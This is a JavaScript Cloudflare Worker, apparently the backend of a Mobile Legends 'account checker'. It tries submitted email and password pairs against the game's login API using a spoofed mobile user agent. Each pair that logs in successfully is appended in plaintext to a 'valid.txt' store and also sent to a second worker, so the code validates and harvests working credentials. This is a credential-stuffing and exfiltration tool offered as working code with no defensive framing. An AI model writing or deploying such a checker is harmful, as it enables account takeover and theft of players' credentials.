const ALLOWED_ORIGIN = "https://8e7f3a7e.mlbb-checker-validator.pages.dev"; // domain frontend
const API_URL = "https://accountmtapi.mobilelegends.com/"; // API MLBB

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Handle CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    if (request.method === "POST" && url.pathname === "/check") {
      try {
        const { email, password, captcha_token } = await request.json();

        if (!email || !password || !captcha_token) {
          return Response.json({ error: "Missing parameters" }, { status: 400 });
        }

        // Hash password MD5 (async)
        const hashedPwd = await md5(password);

        // Kirim request ke API MLBB
        const res = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-G991B) Mobile Safari/537.36",
            "Accept": "*/*",
            "Connection": "keep-alive",
          },
          body: new URLSearchParams({
            op: "login",
            account: email,
            md5pwd: hashedPwd,
            captcha: captcha_token,
            // parameter tambahan sesuai API resmi MLBB
            lang: "en",
            type: "1",
          }),
        });

        if (!res.ok) {
          return Response.json({ error: `MLBB API error: ${res.status}` }, { status: res.status });
        }

        const data = await res.json();

        // Jika valid
        if (data.code === 0) {
          const line = `${email}|${password}\n`;

          // Simpan sementara di KV
          if (env.VALID_ACCOUNTS) {
            let old = (await env.VALID_ACCOUNTS.get("valid.txt")) || "";
            old += line;
            await env.VALID_ACCOUNTS.put("valid.txt", old);
          }

          // Kirim ke Worker B
          if (env.WORKER_B_URL && env.SECRET_KEY) {
            try {
              await fetch(env.WORKER_B_URL + "/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  secret: env.SECRET_KEY,
                  account: `${email}|${password}`,
                }),
              });
            } catch (err) {
              console.error("Gagal kirim ke Worker B:", err);
            }
          }
        }

        return Response.json(data, {
          headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
        });

      } catch (err) {
        return Response.json({ error: err.message }, {
          status: 500,
          headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
        });
      }
    }

    return new Response("Worker A aktif", {
      status: 200,
      headers: { "Access-Control-Allow-Origin": ALLOWED_ORIGIN },
    });
  },
};

// Fungsi MD5 async
async function md5(str) {
  const buf = await crypto.subtle.digest("MD5", new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf))
    .map(b => b.toString(16).padStart(2, "0"))
    .join("");
}
